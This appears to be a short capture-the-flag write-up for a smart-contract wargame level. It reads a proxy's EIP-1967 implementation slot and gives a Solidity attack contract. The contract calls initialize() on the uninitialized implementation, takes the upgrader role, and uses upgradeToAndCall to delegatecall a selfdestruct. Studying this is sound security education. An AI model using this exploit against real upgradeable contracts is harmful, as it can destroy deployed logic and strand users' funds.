Firstly we need to get address of impelemtation.
```
await web3.eth.getStorageAt(contract.address, "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc")
// returns: 0x0000000000000000000000001aadf26f5bf9551955e5e09e391cc6c1d857da60
// implementation address: 0x1aadf26f5bf9551955e5e09e391cc6c1d857da60
```
Loading IEngine interface using `0x1aadf26f5bf9551955e5e09e391cc6c1d857da60` we can see that initialize and horse power have default values.
So `initialize()` wasn't called before. We can call it, set address to `AttackMotorbike` contract.
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


interface IEngine {
    function upgradeToAndCall(address, bytes memory) external payable;
    function initialize() external;
    function upgrader() external view returns(address);
    function horsePower() external view returns(uint256);
}

contract AttackMotorbike {

    function attack(IEngine engine) external {
        // initialize() wasn't call so we can call it and set upgrader to this contract
        engine.initialize();
        // this function uses delegate call to passed address and executes function passed as a second argument
        // we can use it to call function contaning selfdestruct and it will be executed on engine storage
        engine.upgradeToAndCall(address(this), abi.encodeWithSelector(this.destroy.selector));
    }

    function destroy() external {
        selfdestruct(payable(address(0)));
    }
}
```
